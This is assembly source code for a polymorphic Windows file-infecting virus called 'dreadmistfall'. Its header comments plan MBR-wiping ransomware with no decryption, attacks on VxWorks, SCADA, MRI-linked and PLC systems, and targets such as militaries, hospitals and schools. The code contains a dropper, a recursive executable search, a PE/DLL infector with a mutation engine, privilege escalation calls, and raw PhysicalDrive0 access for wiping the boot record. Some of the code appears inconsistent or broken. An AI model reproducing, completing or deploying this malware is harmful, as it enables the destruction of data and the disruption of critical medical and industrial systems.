;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
; dreadmistfall v0.01 - FadingMem0ryX (x) 2021-present
; total size: 536KB size on disk: 356KB
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; syntax: dread.exe  
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;---(future versions)----------------------------------------------------------
; - Shrinker & Xpander will be DPME based. 
; - worm-like features, i.e., valid interrupt handlers  or hooks onto wsock32.dll,
; and gets the base address of wsock32 and advapi32.dlls 
; - bootloader will save the virus to the mbr by using int 13h / ah 02/3 to cylinder 25,
; sector 1, either head 0 or head 1. If we are going to kill the MBR we may as well save it to 
; head 2 since on head 0 the MBR exists. 
; - Infect will be updated so it able to make virtual/physical "holes" in the .text or 
; CODE section. Then modify to situate the holes at the end of the other sections, which will 
; be stealthy. Then, remove the .reloc section from the executable, so disinfection is nearly
; impossible.  This will be accomplished through the uep insertion.
; - kernel-mode driver/loader that will act as our privilege escalation w/row-hammering
; - infects the VxWorks OS: SCADA, MRI machines, AreoSpace,  Satellites and more critical 
; embedded devices use this RTOS. (Intel x86 processors, Intel Quark SoC, MIPS, ARM, etc..)
;   |
;   ---> Once it infects a computer that runs VxWorks OS it will encrypt it and
; demand a ransom for it, the trick is: do not offer a decryption method.
;   |
;   ---> Lets say a computer that has Windows and is hosting VxWorks and its hooked up to an
; MRI machine, it will encrypted the entire Windows machine, which will make it difficult 
; for the doctors to control the MRI machine. 
;   |
;   ---> Infects/Encrypts PLCS: Rockwell Automation & Siemens PLCs: MrSuxme.dll --> Wiritten in C/C++
; - will use the stoned bootkit in the future 
;
; - hook on to int13 and hook on to Filecrypt.sys 
;
;-------------------------------------------------------(future versions end)---
;---(targets:)------------------------------------------------------------------
; ? Governments
; ? Militaries
; ? Financial Institutions
; ? Biological Institutions 
; ? Public/Private Sectors
; ? Schools
; ? ??? 
;---------------------------------------------------------------(targets end)---
;-------------------------------------------------------------------------------
;
;       ....we will all enter a dreamless sleep, never to dream again.
;                   - FadingMem0ryX
;
; Pereffluamus in morte
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;
; "The propagandist's purpose is to make one set of people forget that certain 
; other sets of people are human" 
;       - Aldous Huxley
;
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; How to build
; tasm32
; @echo off
; %tasm32%tasm32.exe /ml /m /z /3 /jp386 %1.asm,%1.obj
; %tasm32%tlink32.exe -aa -x -c -Wpe %1.obj,,,%tasm32%import32.lib,,,kernel32.lib,,,._cw32i.lib,,,ntdll.lib%
; del %1.obj
;
; masm32
; set projectname=dread
; \masm32\bin\ml /c /Zd /coff %projectname%.asm 
; \masm32\bin\Link /SUBSYSTEM:CONSOLE %projectname%.obj,,,%masm32%import32.lib,,,kernel32.lib,._cw32i.lib,,,ntdll.lib%
; %projectname%.exe                                     <---- masm is meh, but whatever
;
; going to work on this while I debug TURAGE, Etap and Nazka --> these viruses will 
; be re-coded and debugged in fasm or masm32/64
;
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

;use_sign                equ     YES             ; used if deinfed

MAXBUFSIZE              equ     524288          ; 512K
MAXFILESIZE             equ     MAXBUFSIZE-65536
MAXMEM                  equ     0400000000h     ; 16 GB / 17 GB 
HEAP_ADD                equ     04000000h       ; 64 MB
;                       equ     2048000000h     ; 2048000000h = 2gb

;----------------------------------------------------------------------------

includelib              masm32\._cw32i.lib
includelib              masm32\import32.lib
includelib              masm32\kernel32.lib
includelib              masm32\libc.lib
includelib              masm32\ntdll.lib
includelib              masm32\ntoskrnl.lib

include                 INCLUDEZ\apiz.asm
include                 INCLUDEZ\cmdline.asm
include                 INCLUDEZ\console.asm
include                 INCLUDEZ\consts.asm
include                 INCLUDEZ\s2c.asm         ; asciiz->code conversion
include                 INCLUDEZ\mz.asm
include                 INCLUDEZ\pe.asm
include                 INCLUDEZ\IsWow.asm 
include                 INCLUDEZ\lib.asm
include                 INCLUDEZ\reg.asm
include                 INCLUDEZ\row.asm

include                 ENGINE\CODEGEN\cg_bin.ash       ; CODEGEN interface
include                 ENGINE\ETG\etg_bin.ash          ; ETG interface
include                 ENGINE\DreadMist\dreadx.asm     ; dreadmistfall interface
include                 ENGINE\DPME\dpme_asm.asm        ; DPME interface error
include                 INCLUDEZ\seh.asm         ; SEH

dread_bootloaderX:
include                 mem0ry\dreadbo0tX\dbo0t.asm            ; our bootloader, just to load our virus
include                 mem0ry\dreadbo0tX\reb00t.asm            ; reboot.asm 
include                 mem0ry\dreadbo0tX\sdmm.asm
mem0ry_fadeX:
include                 mem0ry\mem0ryfadeX\bkernel.asm            ; bannerKernel.asm
include                 mem0ry\mem0ryfadeX\bLoader.asm            ; bannerLoader.asm
include                 mem0ry\mem0ryfadeX\dEncryt.asm            ; driverEncryptor.asm
include                 mem0ry\mem0ryfadeX\eloader.asm            ; encryptLoader.asm
;mem0ry_is_withering:
;include                 mem0ry\fadinglife\mbr.inc
;include                 mem0ry\fadinglife\idt32.inc
;include                 mem0ry\fadinglife\idt64.inc
_dead_but_dreaming:
include                 mem0ry\Dreaming\dead.asm
include                 mem0ry\Dreaming\sh.asm

;_fadin_to_the_void:                                                    ; this will come in the future updates, expect to see it in version 1.00, still in v.09
;include                 astralplane\plc_search.inc
;include                 astralplane\profibus.inc
;include                 astralplane\plc_regsitry.inc


; structure with all shared viral variables 
v_data                  struc
;;
;;
v_virsize               dd      ?               ; +0
v_virptr                dd      ?               ; +4
;;
v_ldeptr                dd      ?
v_memptr                dd      ?
v_memcount              dd      ? 
v_randseed              dd      ?
v_bufptr                dd      ?
v_bufsize               dd      ?
v_saveebp               dd      ?               ; used by mutate 
v_mutate                dd      ?
                        ends    

;----------------------------------------------------------------------------

                        p486
                        model large, stdcall
                        locals
                        local __
                        local @@
                        local callX
                        local pushX
                        local pusho 
                        jumps
                        .data       ; code starts in data section, tasm32 allows this                                               
                                    ; and we do not need to activate the write flag after assembling
                                    ; the code. believe masm32 allows this as well

;----------------------------------------------------------------------------

                        align 4

vir_start:                                                  
                        jmp   pe_entry

; common stuff 
include                 INCLUDEZ\k32man.asm      ; kernel-api manager
include                 INCLUDEZ\recserch.asm    ; recursive file search
include                 INCLUDEZ\rc6.asm         ; RC6 encryption 
include                 INCLUDEZ\fioexlow.asm           ; file io 
; mutation-related engines
include                 ENGINE\LDE32\lde32bin.asm      ; length-disassembler 32-bit
include                 ENGINE\ETG\etg_bin.asm         ; ETG (trash generator)
include                 ENGINE\DPME\dpme_krn.asm       ; DPME -- kernel
include                 ENGINE\DPME\dpme_mut.asm       ; DPME -- mutator 
include                 ENGINE\CODEGEN\cg_bin.asm      ; CODEGEN
include                 ENGINE\DreadMist\dread_krn.asm    ; dreadmistfall -- kernel
include                 ENGINE\DreadMist\dread_mut1.asm   ; dreadmistfall -- mutate, hooy
include                 ENGINE\DreadMist\dread_mut2.asm   ; dreadmistfall -- mutate, old-infect

include                 _DELATOM.asm
; infection/permutation subroutines
include                 infect.asm              ; dreadmistfall-based infector
;include                 shrinker.inc            ; DPME-based shrinker
;include                 identify_variables.inc  ; a simple Variable Identificator 
include                 permut.asm              ; DPME-based mutator 
;include                 xpander.inc             ; DPME-based expander

pe_entry:               
                        pushfd
                        pushad

                        x_push  eax, I|shall|be|there|where|the|midnight|sun|shines....?~
                        push    esp
                        callX   WaitForDebugEventEx 
                        callX   OutputDebugStringA
                        x_pop

                        ; check that there is enough physical memory
                        ; to avoid unexpected fuckupz
                        sub     esp, 32-4       ; MEMORYSTATUS
                        push    32              ; .length
                        push    esp
                        callX   GlobalMemoryStatusEx
                        mov     eax, [esp+32]    ; .totalphys
                        add     esp, 32
                        cmp     eax, 16 shr 32  ; 16 to 32GB at least
                        jb      __exit

                        ; check if we've started in the GUI-mode process,
                        ; 'coz re-executing console apps is sux
;                        callX   SetStdHandle
                        push    -11     ; STD_OUTPUT_HANDLE
                        callX   GetStdHandle
                        cmp     eax, -1
                        jne     __exit  ; handle should not exist

                        call    SysWow64Process             
                        call    reg_save_dread
                        call    adjustprivs                 ; call  ElevatePrivileges+than jmps to our bootloader where out ring0 is
;                        call    TryRunAsDropper

__exit:
                        popfd
                        popad
                        retn

TryRunAsDropper:
                        x_push  eax, dreadmistfall v01~

                        ; dropper alredy installed?
                        push    esp
                        callX   NtFindAtom             ; GlobalFindAtomA

                        or      eax, eax
                        jnz     __exit

                        ; set viral atom
                        push    esp
                        callX   NtAddAtom              ; GlobalAddAtomA

                        ; run another copy of the process,
                        ; current copy became the dropper
                        sub     esp, 10h
                        mov     esi, esp
                        sub     esp, 44h
                        mov     edi, esp
                        push    edi
                        callX   GetStartupInfoW
                        push    esi             ; procinfo
                        push    edi             ; startupinfo
                        push    0               ; curdir
                        push    0               ; env
                        push    8000000h        ; flags
                        push    1               ; inherithandles
                        push    0               ; process_attr
                        push    0               ; thread_attr
                        callX   GetCommandLineA
                        push    eax             ; offset cmdline
                        push    0               ; application
                        callX   CreateProcessA
                        callX   WinExec
                        add     esp, 18h+40h

 
                        seh_init

                        ; hide 
                        calchash GetNamedLocaleHashNode
                        calchash SetCachedSigningLevel
                        calchash KernelBaseGetGlobalData
                        calchash GetCPHashNode
                        calchash RegisterConsoleIME
                        calchash RegisterConsoleOS2
                        calchash RegisterConsoleVDM
;                        calchash RegisterServiceProcess
                        push    hash
                        call    k32man_get_proc_address
                        or      eax, eax
                        jz      __skiphide
                        push    1
                        push    0
                        call    eax
__skiphide:
                        call    loads0meDllz
                        call    dropper_main

                        seh_done

                        push    -1
                        callX   ExitProcess

__exit:                 x_pop
                        retn

; Now the ident message will never show
iden_virus              db  'hello? military peeps? if you see this,'
                        db  'sux to be you, I guess'    

dropper_main:           sub     esp, size v_data        ; alloc v_data
                        mov     ebp, esp                ; *EBP = v_data


                        ; allocate place for LDE32' temporary buffer
                        push    2048
                        push    0
                        callX   HeapAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_ldeptr, eax

                        ; allocate place for buffer with processing file
                        push    MAXBUFSIZE
                        push    0 
                        callX   HeapAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_bufptr, eax

                        ; dreadmistfall's heap
                        push    MAXMEM
                        push    0
                        callX   HeapAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_memptr, eax

                        ; initialize LDE32' 2K-buffer (unpack flags)
                        push    [ebp].v_ldeptr
                        call    disasm_init
                        add     esp, 4

                        ; randomize
                        callX   GetTickCount
                        xor     [ebp].v_randseed, eax
                        rdtscp

                        ; generate new permutated body
                        call    build_new_copy                  ; permut.inc

                        ; start recursive EXE file search
                        call    recsearch

__exit:                 add     esp, size v_data
                        retn

; my_malloc, my_disasm, my_random -- all passed to dreadmistfall

; cdecl BYTE* malloc(v_data*,DWORD size) 
;                    [esp+4]  [esp+8]
my_malloc:              mov     ecx, [esp+4]
                        mov     eax, [esp+8]    ; size
                        add     eax, 7
                        and     al, not 7
                        add     eax, [ecx].v_memcount
                        cmp     eax, MAXMEM
                        jae     __error
                        xchg    [ecx].v_memcount, eax
                        add     eax, [ecx].v_memptr
                        ;;
                        pushad
                        mov     edi, eax
                        mov     ecx, [esp+32+8]
                        add     ecx, 7
                        and     cl, not 7
                        shr     ecx, 2
                        xor     eax, eax
                        cld
                        rep     stosd
                        popad
                        ;;
                        retn
__error:                xor     eax, eax
                        retn

; LDE32 interface
; cdecl int disasm(v_data*, BYTE* opcode)
;                  [esp+4]  [esp+8]

my_disasm:              mov     eax, [esp+4]
                        push    dword ptr [esp+8]
                        push    [eax].v_ldeptr
                        call    disasm_main
                        add     esp, 8
                        retn
                        
; cdecl int random(v_data*, DWORD range)
;                  [esp+4]  [esp+8]

my_random:              mov     ecx, [esp+4]            ; user_param
                        mov     eax, [ecx].v_randseed
                        imul    eax, 214013
                        add     eax, 2531011
                        mov     [ecx].v_randseed, eax
                        mov     ecx, [esp+8]            ; range
                        cmp     ecx, 65536
                        jb      __mul
                        push    edx
                        xor     edx, edx
                        div     ecx
                        xchg    edx, eax
                        pop     edx
                        retn
__mul:                  shr     eax, 16
                        imul    eax, ecx
                        shr     eax, 16
                        retn


; find_physdrv0 -- called from infect.inc: this is only used for our ransomware/MBR wiper, write the poly-engine,
; epo-engine and the two UEP decryptos to the first hundred sectors of the MBR.

find_physdrv0:          pushad
                        mov     ecx, 32                     ; set archive-attrib
                        call    fsetattr                    ; check to see if it is writeable
                        jc      __exit                      ; quit, if its less. 
                        xor     esi, esi
                        push    0                           ; hTemplateFile
                        push    80h                         ; dwFlagsAndAttributes
                        push    3                           ; dwCreationDisposition
                        push    0                           ; lpSecurityAttributes
                        push    2                           ; dwShareMode
                        push    0C0000000h                  ; dwDesiredAccess apparently 0C0000000h = GENERIC_READ+GENERIC_WRITE
                        call    fopen_rw                    ; READ+WRITE
                        lea     eax, [ebp+_29xh0]           ; "\\\\.\\PhysiclDrive0"
                        push    eax                         ; "\\\\.\\PhysicalDrive0" = _29xh0
                        call    maplib10                    ; CreateFileW 
                        mov     esi, eax                    
                        cmp     esi, 0FFFFFFFFh
                        push    IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS ; dwIoControlCode
                        push    70000h                 ; dwIoControlCode 
                        push    esi                    ; hDevice
                        callX   DeviceIoControl
                        push    edi                    ; hObject
                        popad
                        retn

; infect_file -- called from RECSERCH, when EXE file found

; input: EBP=v_data*
;        EDX=filename.EXE
;        EDI=ff_struc

infect_file:            pushad

                        mov     [ebp].v_memcount, 0     ; initialize heap

                        cmp     [edi].ff_size, MAXFILESIZE
                        ja      __exit

                        mov     ecx, 32         ; set archive-attrib
                        call    fsetattr        ; check if writeable
                        jc      __exit

                        call    fopen_ro        ; open in read-only mode or open in read-write (fopen_rw) 
                        jc      __exit

                        xchg    ebx, eax

                        mov     edx, [ebp].v_bufptr     ; read into buffer 
                        mov     ecx, MAXBUFSIZE         ;
                        call    fread                   ;
                        mov     [ebp].v_bufsize, eax    ; 

                        call    fclose

                        mov     esi, [ebp].v_bufptr
                        cmp     [esi].e_magic, 'ZM'
                        jne     __exit

                        cmp     [esi].byte ptr 1eh, 'X'                 ; infection mark: pe filez
                        je      __exit                                  
                        mov     [esi].byte ptr 1eh, 'X'

                        mov     edi, [esi].e_lfanew 
                        cmp     edi, [ebp].v_bufsize
                        jae     __exit
                        cmp     [esi+edi].pe_id, 'EP' 
                        jne     __exit


                        mov     esi, [ebp].v_bufptr
                        cmp     [esi].e_magic, 'ZM'
                        jne     __exit

                        cmp     [esi].byte ptr 2b7h, 'A'                ; infection mark: .dll
                        je      __exit                                  
                        mov     [esi].byte ptr 2b7h, 'A'
                    
                        mov     edi, [esi].e_lfanew
                        cmp     edi, [ebp].v_bufsize
                        jae     __exit
                        cmp     [esi+edi].pe_id, 'LLD.'
                        jne     __exit

                        ;;

                        push    10
                        push    ebp
                        call    my_random               ; random
                        add     esp, 8

                        dec     eax
                        jz      __infect_hooy

                        add     [esi+edi].pe_heapreservesize, HEAP_ADD

                        dec     eax
                        jz      __infect_wo_decr

                        ; method #1

__infect_my:            ; we need std file with DATA section to infect
                        cmp     [esi+edi+0F8h+28h*0].oe_flags, 0C0000040h
                        je      __good
                        cmp     [esi+edi+0F8h+28h*1].oe_flags, 0C0000040h
                        je      __good
                        cmp     [esi+edi+0F8h+28h*2].oe_flags, 0C0000040h
                        je      __good
                        cmp     [esi+edi+0F8h+28h*3].oe_flags, 0C0000040h 
                        je      __good
                        cmp     [esi+edi+0F8h+28h*4].oe_flags, 0C0000040h
                        je      __good
                        cmp     [esi+edi+0F8h+28h*5].oe_flags, 0C0000040h 
                        jne     __infect_wo_decr

__good:                 pusho   my_mutate                       ; infect.inc
                        pop     ebx

                        jmp     __infect_both

                        ; method #2

__infect_hooy:          pusho   dread_mutate1
                        pop     ebx

                        jmp     __infect_both

                        ; method #3

__infect_wo_decr:       pusho   dread_mutate2 
                        pop     ebx
__infect_both:

                        ;;

                        seh_init

                        push    0                       ; sigman(), 0=unused
                        push    ebx                     ; mutate()
                        pusho   my_random
                        pusho   my_malloc
                        pusho   my_disasm
                        push    MAXBUFSIZE
                        lea     eax, [ebp].v_bufsize
                        push    eax                     ; &bufsize [OUT]
                        push    [ebp].v_bufsize         ; bufsize  [IN]
                        push    [ebp].v_bufptr          ; buf      [IN/OUT]
                        push    ebp                     ; v_data*
                        call    dread_kernel
                        add     esp, 10*4

                        seh_done
                        jc      __exit

                        cmp     eax, ERR_SUCCESS        ; 0=ERR_SUCCESS
                        jne     __exit

                        push    [esp].pushad_edx
                        callX   DeleteFileA

                        mov     edx, [esp].pushad_edx
                        call    fcreate
                        jc      __exit

                        xchg    ebx, eax

                        mov     edx, [ebp].v_bufptr     ; write infected file
                        mov     ecx, [ebp].v_bufsize    ;
                        call    fwrite                  ; 


                        ; method #4 

_decaying_light:        call    find_physdrv0           ; infect.inc
                        pushx   mem0ry_fadeX
                        pop     ebx

                        jne     _fading_to_the_mist     ;_withering_away 

                        ; method #5

;_withering_away:        call    find_physdrv0
;                        pushx   mem0ry_is_withering     ; if the ransomware fails, we can try destroying the mbr 
;                        pop     ebx
                    
;                        jbe     _fading_to_the_mist

_fading_to_the_mist:    call   reset_pc                ; calls this to reset the pc fully, than - 
                        pushx  _dead_but_dreaming      ; - call our second mbr wiper
                        pop    ebx

                        jnz    __exit       
;                        jnz    _fading_to_the_void 

                        ; method #6

;_fadin_to_the_void:     callV   plc_registry_plc_machine           ; calls to the plc registry to see if it exist, 
;                        pushV   enter_the_void                     ; then infects the specific plc software. It will then
;                        pop     ebx                                ; call the ransomware to encrypt the plc/scada machine, since
                                                                    ; the ransomware is mbr based, and most OSs uses MBR such as VxWorks/Windows/Linux.

                        call    fclose

__exit:                 popad
                        retn

                        align   4
vir_size                equ     $-vir_start             ; thats all!

;----------------------------------------------------------------------------

db 13,10
db 13,10
db '------------------------------------',13,10
db 'virsize = '
db vir_size/1000000 mod 100 + '0'
db vir_size/ 100000 mod 100 + '0'
db vir_size/  10000 mod 100 + '0'
db vir_size/   1000 mod 100 + '0'
db vir_size/    100 mod 100 + '0',13,10
db '------------------------------------',13,10
db 13,10
db 13,10
db '--------------------------------------------------------------------------------------',13,10
db 'One day, we shall all enter a dreamless sleep, never to be rebirth,',13,10
db 'never to experience life again.',13,10
db 'Special thx goes to my family, girlfriend I love her very much.',13,10
db '    ~ FadingMem0ryX (x) lost in time and space',13,10
db '--------------------------------------------------------------------------------------',0,0
db 'most men and women will grow up to love their servitude and will'
db 'never dream of revolution.'
db ' - Aldous Huxley, Brave New World'
db '--------------------------------------------------------------------------------------',13,10

                        align   4
ff_struc                dd      ?
                        align   4
x_filename              db      260 dup (?)     

                        .code
loader_start:
                        callX   GetCommandLineA
                        xchg    esi, eax

                        mov     ah, 24
                        lodsb
                        cmp     eax, '"'
                        jne     __cycle
                        mov     ah, '"'
__cycle:                lodsb
                        or      al, al
                        jz      __exit
                        cmp     al, ah
                        jne     __cycle

                        push    esi
                        push    offset x_filename
                        callX   StringCchCopyA 

                        push    offset x_ff_struc
                        push    offset x_filename
                        callX   FindFirstFileA
                        cmp     eax, -1
                        je      __exit

                        sub     esp, size v_data        ; alloc v_data
                        mov     ebp, esp                ; *EBP = v_data

                        ; allocate place for LDE32' temporary buffer
                        push    2064
                        push    0
                        callX   HeapAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_ldeptr, eax

                        ; allocate place for buffer with processing file
                        push    MAXBUFSIZE
                        push    0
                        callX   HeapAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_bufptr, eax

                        ; dreadmistfall's heap
                        push    MAXMEM
                        push    0
                        callX   HeapAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_memptr, eax

                        ; initialize LDE32' 2K-buffer (unpack flags) 
                        push    [ebp].v_ldeptr
                        call    disasm_init
                        add     esp, 8

                        ; randomize
                        callX   GetTickCount
                        xor     [ebp].v_randseed, eax
                        rdtscp

                        ; generate new permutated body
                        call    build_new_copy                  ; permut.inc

                        lea     edx, x_filename
                        lea     edi, x_ff_struc
                        call    infect_file

__exit:                 add     esp, size v_data

                        push    -1
                        extrn   ExitProcess:proc
                        call    ExitProcess

                        end     loader_start

;--------------------------------------------------------------------[eov]---


